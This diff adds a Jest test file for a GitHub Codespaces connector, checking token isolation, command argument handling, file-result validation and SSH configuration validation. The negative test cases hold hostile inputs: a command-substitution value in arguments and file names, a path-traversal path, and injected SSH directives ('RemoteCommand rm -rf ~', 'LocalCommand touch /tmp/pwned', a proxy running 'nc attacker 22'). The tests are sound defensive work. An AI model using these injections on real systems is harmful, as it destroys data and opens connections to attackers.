@@ -1,0 +1,593 @@
+import { describe, expect, jest, test } from "@jest/globals";
+import { spawn as spawnProcess } from "node:child_process";
+import { EventEmitter } from "node:events";
+import { resolve } from "node:path";
+import type { ClientRequest, IncomingMessage, RequestOptions } from "node:http";
+import { GitHubCodespacesConnector } from "../../../packages/web-backend/src/services/github-codespaces-connector.js";
+import {
+  CONNECTOR_MAX_REQUEST_BYTES,
+  CONNECTOR_MAX_RESPONSE_BYTES,
+  encodeConnectorRequest,
+  encodeConnectorResponse,
+  validateCodespaceSshConfig,
+} from "../../../packages/web-backend/src/services/github-codespaces-connector-protocol.mjs";
+import type { WorkspaceOperationRecord, WorkspaceResourceRecord } from "@mcp-moira/shared";
+
+function requestHarness(responder: (body: unknown, options: RequestOptions) => unknown) {
+  const calls: Array<{ options: RequestOptions; body: string }> = [];
+  const requestImpl = (
+    options: RequestOptions,
+    callback: (response: IncomingMessage) => void,
+  ): ClientRequest => {
+    const request = new EventEmitter() as ClientRequest;
+    Object.assign(request, {
+      setTimeout: jest.fn(),
+      destroy: (error?: Error) => queueMicrotask(() => request.emit("error", error)),
+      end: (payload?: Buffer) => {
+        const body = payload?.toString("utf8") ?? "";
+        calls.push({ options, body });
+        const response = new EventEmitter() as IncomingMessage;
+        response.statusCode = 200;
+        callback(response);
+        const value = Buffer.from(
+          JSON.stringify(responder(body ? JSON.parse(body) : null, options)),
+        );
+        queueMicrotask(() => {
+          response.emit("data", value);
+          response.emit("end");
+        });
+      },
+    });
+    return request;
+  };
+  return { calls, requestImpl };
+}
+
+const workspace = {
+  id: "workspace-1",
+  userId: "user-1",
+  provider: "github-codespaces",
+  providerResourceName: "silver-space-123",
+  repositoryFullName: "owner/repository",
+} as WorkspaceResourceRecord;
+const operation = {
+  id: "operation-1",
+  userId: "user-1",
+  resourceId: "workspace-1",
+  remoteMarker: "moira-op-0123456789abcdef0123456789abcdef",
+  stdoutLimitBytes: 4096,
+  stderrLimitBytes: 4096,
+} as WorkspaceOperationRecord;
+const version = { size: 3, sha256: "a".repeat(64), modifiedAt: 1 };
+
+function fileOperation(kind: WorkspaceOperationRecord["kind"]): WorkspaceOperationRecord {
+  return { ...operation, kind };
+}
+
+describe("GitHub Codespaces connector boundary", () => {
+  test("passes credentials only in the Unix-socket request body", async () => {
+    const harness = requestHarness(() => ({
+      value: "Host silver-space-123\n  ProxyCommand gh codespace ssh --stdio\n",
+    }));
+    const connector = new GitHubCodespacesConnector(
+      harness.requestImpl,
+      "/run/test/connector.sock",
+    );
+    await connector.probeSshConfiguration("ghu_topsecret", "silver-space-123");
+
+    expect(harness.calls).toHaveLength(1);
+    expect(harness.calls[0].options).toMatchObject({
+      socketPath: "/run/test/connector.sock",
+      path: "/job",
+      method: "POST",
+    });
+    expect(JSON.parse(harness.calls[0].body)).toEqual({
+      action: "ssh-config",
+      token: "ghu_topsecret",
+      resourceName: "silver-space-123",
+    });
+    expect(JSON.stringify(harness.calls[0].options)).not.toContain("ghu_topsecret");
+  });
+
+  test("reports sidecar health without contacting a workspace", async () => {
+    const harness = requestHarness(() => ({ state: "available", reason: null }));
+    const connector = new GitHubCodespacesConnector(harness.requestImpl);
+    await expect(connector.health()).resolves.toEqual({ ok: true, reason: null });
+    expect(harness.calls[0].options).toMatchObject({ path: "/health", method: "GET" });
+  });
+
+  test("preserves argv boundaries, stdin bytes and exact nonzero results", async () => {
+    const harness = requestHarness(() => ({
+      value: JSON.stringify({
+        state: "failed",
+        stdoutBase64: Buffer.from("partial").toString("base64"),
+        stderrBase64: Buffer.from("expected").toString("base64"),
+        exitCode: 23,
+      }),
+    }));
+    const connector = new GitHubCodespacesConnector(harness.requestImpl);
+    await expect(
+      connector.execute("ghu_topsecret", workspace, operation, {
+        argv: ["printf", "%s", "a value;$(false)"],
+        cwd: ".",
+        stdin: { kind: "inline", bytes: new TextEncoder().encode("input") },
+        timeoutMs: 5_000,
+        maxStdoutBytes: 4096,
+        maxStderrBytes: 4096,
+      }),
+    ).resolves.toEqual({
+      state: "failed",
+      stdout: "partial",
+      stderr: "expected",
+      exitCode: 23,
+    });
+    const body = JSON.parse(harness.calls[0].body);
+    expect(body.job.argv).toEqual(["printf", "%s", "a value;$(false)"]);
+    expect(Buffer.from(body.job.stdin, "base64").toString("utf8")).toBe("input");
+    expect(JSON.stringify(harness.calls[0].options)).not.toContain("ghu_topsecret");
+  });
+
+  test("carries contract-max stdin and independent output streams inside wire envelopes", async () => {
+    const harness = requestHarness(() => ({ value: JSON.stringify({ state: "running" }) }));
+    const connector = new GitHubCodespacesConnector(harness.requestImpl);
+    await connector.execute("ghu_topsecret", workspace, operation, {
+      argv: ["true"],
+      cwd: ".",
+      stdin: { kind: "inline", bytes: Buffer.alloc(4 * 1024 * 1024, "a") },
+      timeoutMs: 5_000,
+      maxStdoutBytes: 8 * 1024 * 1024,
+      maxStderrBytes: 8 * 1024 * 1024,
+    });
+    expect(Buffer.byteLength(harness.calls[0].body)).toBeLessThanOrEqual(
+      CONNECTOR_MAX_REQUEST_BYTES,
+    );
+    expect(Buffer.byteLength(harness.calls[0].body)).toBeGreaterThan(4 * 1024 * 1024);
+
+    const remoteWireResult = encodeConnectorResponse({
+      state: "failed",
+      stdoutBase64: Buffer.alloc(8 * 1024 * 1024).toString("base64"),
+      stderrBase64: Buffer.alloc(8 * 1024 * 1024).toString("base64"),
+      exitCode: 23,
+    });
+    const maximumWireResult = encodeConnectorResponse({
+      value: remoteWireResult.toString("utf8"),
+    });
+    expect(maximumWireResult.length).toBeLessThanOrEqual(CONNECTOR_MAX_RESPONSE_BYTES);
+    expect(() =>
+      encodeConnectorRequest({ padding: "x".repeat(CONNECTOR_MAX_REQUEST_BYTES) }),
+    ).toThrow(/exceeded its bound/);
+  });
+
+  test("sends an explicit remote finalize operation", async () => {
+    const harness = requestHarness(() => ({ value: JSON.stringify({ state: "absent" }) }));
+    const connector = new GitHubCodespacesConnector(harness.requestImpl);
+    await expect(
+      connector.finalize("ghu_topsecret", workspace, operation),
+    ).resolves.toBeUndefined();
+    expect(JSON.parse(harness.calls[0].body).job).toMatchObject({
+      action: "finalize",
+      remoteMarker: operation.remoteMarker,
+    });
+  });
+
+  test("transports typed binary file requests and results without shell reinterpretation", async () => {
+    const output = Buffer.from([9, 0, 255]);
+    const harness = requestHarness(() => ({
+      value: JSON.stringify({
+        state: "succeeded",
+        value: {
+          action: "read",
+          path: "src/a value;$(false).bin",
+          offset: 0,
+          totalSize: output.length,
+          bytesBase64: output.toString("base64"),
+          sha256: "a".repeat(64),
+        },
+      }),
+    }));
+    const connector = new GitHubCodespacesConnector(harness.requestImpl);
+    await expect(
+      connector.executeFile("ghu_topsecret", workspace, fileOperation("read"), {
+        action: "read",
+        path: "src/a value;$(false).bin",
+        offset: 0,
+        length: 3,
+      }),
+    ).resolves.toEqual({
+      action: "read",
+      path: "src/a value;$(false).bin",
+      offset: 0,
+      totalSize: 3,
+      bytes: output,
+      sha256: "a".repeat(64),
+    });
+    const job = JSON.parse(harness.calls[0].body).job;
+    expect(job.action).toBe("file-execute");
+    expect(job.request).toEqual({
+      action: "read",
+      path: "src/a value;$(false).bin",
+      offset: 0,
+      length: 3,
+    });
+  });
+
+  test("owns and transmits the remote patch-summary byte budget", async () => {
+    const harness = requestHarness(() => ({ value: JSON.stringify({ state: "running" }) }));
+    const connector = new GitHubCodespacesConnector(harness.requestImpl);
+    await expect(
+      connector.executeFile("ghu_topsecret", workspace, fileOperation("apply_patch"), {
+        action: "apply_patch",
+        files: [
+          {
+            path: "file.bin",
+            expected: { exists: true },
+            edits: [{ start: 0, end: 1, bytes: Buffer.from("b") }],
+          },
+        ],
+      }),
+    ).resolves.toEqual({ state: "running" });
+    expect(JSON.parse(harness.calls[0].body).job.request).toMatchObject({
+      action: "apply_patch",
+      summaryMaxBytes: 4096,
+      files: [
+        {
+          path: "file.bin",
+          edits: [{ start: 0, end: 1, bytesBase64: Buffer.from("b").toString("base64") }],
+        },
+      ],
+    });
+  });
+
+  test.each([
+    [
+      "negative read offset",
+      "read",
+      {
+        state: "succeeded",
+        value: {
+          action: "read",
+          path: "file.bin",
+          offset: -1,
+          totalSize: 3,
+          bytesBase64: Buffer.from("abc").toString("base64"),
+          sha256: "a".repeat(64),
+        },
+      },
+    ],
+    [
+      "read range beyond total size",
+      "read",
+      {
+        state: "succeeded",
+        value: {
+          action: "read",
+          path: "file.bin",
+          offset: 2,
+          totalSize: 3,
+          bytesBase64: Buffer.from("ab").toString("base64"),
+          sha256: "a".repeat(64),
+        },
+      },
+    ],
+    [
+      "file stat without a version",
+      "stat",
+      {
+        state: "succeeded",
+        value: {
+          action: "stat",
+          stat: {
+            path: "file.bin",
+            type: "file",
+            size: 3,
+            mode: 0o600,
+            modifiedAt: 1,
+            version: null,
+          },
+        },
+      },
+    ],
+    [
+      "directory stat with file metadata",
+      "stat",
+      {
+        state: "succeeded",
+        value: {
+          action: "stat",
+          stat: { path: "src", type: "directory", size: 3, mode: 0o755, modifiedAt: 1, version },
+        },
+      },
+    ],
+    [
+      "search noncanonical traversal path",
+      "search",
+      {
+        state: "succeeded",
+        value: {
+          action: "search",
+          matches: [{ path: "..\\secret", line: 1, column: 1, preview: "secret" }],
+          truncated: false,
+        },
+      },
+    ],
+    [
+      "nonpositive search coordinate",
+      "search",
+      {
+        state: "succeeded",
+        value: {
+          action: "search",
+          matches: [{ path: "file.txt", line: 0, column: 1, preview: "text" }],
+          truncated: false,
+        },
+      },
+    ],
+    [
+      "write with malformed previous version",
+      "write",
+      {
+        state: "succeeded",
+        value: {
+          action: "write",
+          path: "file.bin",
+          previous: { ...version, sha256: "invalid" },
+          current: version,
+        },
+      },
+    ],
+    [
+      "patch with duplicate paths",
+      "apply_patch",
+      {
+        state: "succeeded",
+        value: {
+          action: "apply_patch",
+          files: [
+            { path: "file.bin", previous: version, current: version },
+            { path: "file.bin", previous: version, current: version },
+          ],
+          summary: {
+            filesChanged: 2,
+            editsApplied: 2,
+            insertedBytes: 2,
+            deletedBytes: 2,
+            entries: [
+              { path: "file.bin", edits: 1, insertedBytes: 1, deletedBytes: 1 },
+              { path: "file.bin", edits: 1, insertedBytes: 1, deletedBytes: 1 },
+            ],
+            truncated: false,
+          },
+        },
+      },
+    ],
+    [
+      "patch with inconsistent summary",
+      "apply_patch",
+      {
+        state: "succeeded",
+        value: {
+          action: "apply_patch",
+          files: [{ path: "file.bin", previous: version, current: version }],
+          summary: {
+            filesChanged: 1,
+            editsApplied: 2,
+            insertedBytes: 2,
+            deletedBytes: 2,
+            entries: [{ path: "file.bin", edits: 1, insertedBytes: 1, deletedBytes: 1 }],
+            truncated: false,
+          },
+        },
+      },
+    ],
+    [
+      "successful envelope with failure value",
+      "write",
+      {
+        state: "succeeded",
+        value: { action: "write", state: "failed", code: "WORKSPACE_FILE_REJECTED" },
+      },
+    ],
+    [
+      "failed envelope with success value",
+      "write",
+      {
+        state: "failed",
+        value: { action: "write", path: "file.bin", previous: null, current: version },
+      },
+    ],
+    [
+      "operation/result action mismatch",
+      "write",
+      {
+        state: "succeeded",
+        value: { action: "upload", path: "file.bin", previous: null, current: version },
+      },
+    ],
+    [
+      "unexpected result field",
+      "write",
+      {
+        state: "succeeded",
+        value: { action: "write", path: "file.bin", previous: null, current: version, secret: "x" },
+      },
+    ],
+  ] as const)("rejects malformed file result: %s", async (_name, kind, envelope) => {
+    const harness = requestHarness(() => ({ value: JSON.stringify(envelope) }));
+    const connector = new GitHubCodespacesConnector(harness.requestImpl);
+    await expect(
+      connector.inspectFile("ghu_topsecret", workspace, fileOperation(kind)),
+    ).rejects.toThrow(/invalid|inconsistent/);
+  });
+
+  test("accepts a complete bounded patch result from the remote trust boundary", async () => {
+    const patchResult = {
+      action: "apply_patch",
+      files: [{ path: "file.bin", previous: version, current: version }],
+      summary: {
+        filesChanged: 1,
+        editsApplied: 1,
+        insertedBytes: 3,
+        deletedBytes: 3,
+        entries: [{ path: "file.bin", edits: 1, insertedBytes: 3, deletedBytes: 3 }],
+        truncated: false,
+      },
+    } as const;
+    const harness = requestHarness(() => ({
+      value: JSON.stringify({ state: "succeeded", value: patchResult }),
+    }));
+    const connector = new GitHubCodespacesConnector(harness.requestImpl);
+    await expect(
+      connector.inspectFile("ghu_topsecret", workspace, fileOperation("apply_patch")),
+    ).resolves.toEqual(patchResult);
+  });
+
+  test("accepts truncated patch entries when aggregate totals remain complete", async () => {
+    const patchResult = {
+      action: "apply_patch",
+      files: [
+        { path: "one.bin", previous: version, current: version },
+        { path: "two.bin", previous: version, current: version },
+      ],
+      summary: {
+        filesChanged: 2,
+        editsApplied: 2,
+        insertedBytes: 6,
+        deletedBytes: 6,
+        entries: [{ path: "one.bin", edits: 1, insertedBytes: 3, deletedBytes: 3 }],
+        truncated: true,
+      },
+    } as const;
+    const harness = requestHarness(() => ({
+      value: JSON.stringify({ state: "succeeded", value: patchResult }),
+    }));
+    const connector = new GitHubCodespacesConnector(harness.requestImpl);
+    await expect(
+      connector.inspectFile("ghu_topsecret", workspace, fileOperation("apply_patch")),
+    ).resolves.toEqual(patchResult);
+  });
+
+  test("accepts the repository root as a directory stat result", async () => {
+    const statResult = {
+      action: "stat",
+      stat: { path: ".", type: "directory", size: 0, mode: 0o755, modifiedAt: 1, version: null },
+    } as const;
+    const harness = requestHarness(() => ({
+      value: JSON.stringify({ state: "succeeded", value: statResult }),
+    }));
+    const connector = new GitHubCodespacesConnector(harness.requestImpl);
+    await expect(
+      connector.inspectFile("ghu_topsecret", workspace, fileOperation("stat")),
+    ).resolves.toEqual(statResult);
+  });
+
+  test("fails closed when the sidecar returns token-bearing output", async () => {
+    const harness = requestHarness(() => ({ value: "ProxyCommand ghu_topsecret" }));
+    const connector = new GitHubCodespacesConnector(harness.requestImpl);
+    await expect(
+      connector.probeSshConfiguration("ghu_topsecret", "silver-space-123"),
+    ).rejects.toThrow(/Codespace/);
+  });
+
+  test("rejects a malformed remote terminal envelope", async () => {
+    const harness = requestHarness(() => ({
+      value: JSON.stringify({
+        state: "succeeded",
+        stdoutBase64: "not-base64",
+        stderrBase64: "",
+        exitCode: 0,
+      }),
+    }));
+    const connector = new GitHubCodespacesConnector(harness.requestImpl);
+    await expect(
+      connector.execute("ghu_topsecret", workspace, operation, {
+        argv: ["true"],
+        cwd: ".",
+        stdin: { kind: "inline", bytes: new Uint8Array() },
+        timeoutMs: 5_000,
+        maxStdoutBytes: 4096,
+        maxStderrBytes: 4096,
+      }),
+    ).rejects.toThrow(/result contract/);
+  });
+
+  test("the reviewed worker rejects oversized stdin without echoing credential bytes", async () => {
+    const workerPath = resolve(
+      process.cwd(),
+      "packages/web-backend/src/services/github-codespaces-connector-worker.ts",
+    );
+    const result = await new Promise<{ code: number | null; stdout: string; stderr: string }>(
+      (resolveResult, reject) => {
+        const child = spawnProcess(
+          process.execPath,
+          ["--import", "tsx", workerPath, "ssh-config", "silver-space-123"],
+          { stdio: ["pipe", "pipe", "pipe"] },
+        );
+        const stdout: Buffer[] = [];
+        const stderr: Buffer[] = [];
+        child.stdout.on("data", (chunk) => stdout.push(Buffer.from(chunk)));
+        child.stderr.on("data", (chunk) => stderr.push(Buffer.from(chunk)));
+        child.once("error", reject);
+        child.once("close", (code) =>
+          resolveResult({
+            code,
+            stdout: Buffer.concat(stdout).toString("utf8"),
+            stderr: Buffer.concat(stderr).toString("utf8"),
+          }),
+        );
+        child.stdin.end(
+          JSON.stringify({
+            token: `ghu_${"secret".repeat(700_000)}`,
+            home: "/tmp/moira-codespaces-connector-oversized",
+          }),
+        );
+      },
+    );
+    expect(result.code).toBe(1);
+    expect(result.stdout).toBe("");
+    expect(result.stderr).toContain("Codespaces connector worker failed");
+    expect(result.stderr).not.toContain("ghu_secret");
+  });
+
+  describe("generated SSH configuration validation", () => {
+    const home = "/tmp/moira-codespaces-connector-abc123";
+    const key = `${home}/.ssh/codespaces.auto`;
+    const generated = [
+      "Host cs.silver-space-123.main",
+      "\tUser codespace",
+      `\tProxyCommand /usr/bin/gh cs ssh -c silver-space-123 --stdio -- -i ${key}`,
+      "\tUserKnownHostsFile=/dev/null",
+      "\tStrictHostKeyChecking no",
+      "\tLogLevel quiet",
+      "\tControlMaster auto",
+      `\tIdentityFile ${key}`,
+      "",
+    ].join("\n");
+
+    test("accepts exactly what gh codespace ssh --config generates for the Codespace", () => {
+      expect(
+        validateCodespaceSshConfig(generated, { home, resourceName: "silver-space-123" }),
+      ).toBe(true);
+    });
+
+    test.each([
+      ["another Codespace", generated.replaceAll("silver-space-123", "other-space-9")],
+      [
+        "a foreign identity file",
+        generated.replace(`IdentityFile ${key}`, "IdentityFile /root/.ssh/id_ed25519"),
+      ],
+      [
+        "a foreign key in the proxy command",
+        generated.replace(`-- -i ${key}`, "-- -i /etc/passwd"),
+      ],
+      ["a local command hook", `${generated}\tLocalCommand touch /tmp/pwned\n`],
+      ["a remote command override", `${generated}\tRemoteCommand rm -rf ~\n`],
+      ["an include directive", `${generated}\tInclude /etc/ssh/ssh_config\n`],
+      ["a second host block", `${generated}Host evil\n\tProxyCommand nc attacker 22\n`],
+      ["a missing proxy command", generated.replace(/\tProxyCommand[^\n]*\n/, "")],
+    ])("rejects %s", (_label, config) => {
+      expect(validateCodespaceSshConfig(config, { home, resourceName: "silver-space-123" })).toBe(
+        false,
+      );
+    });
+  });
+});
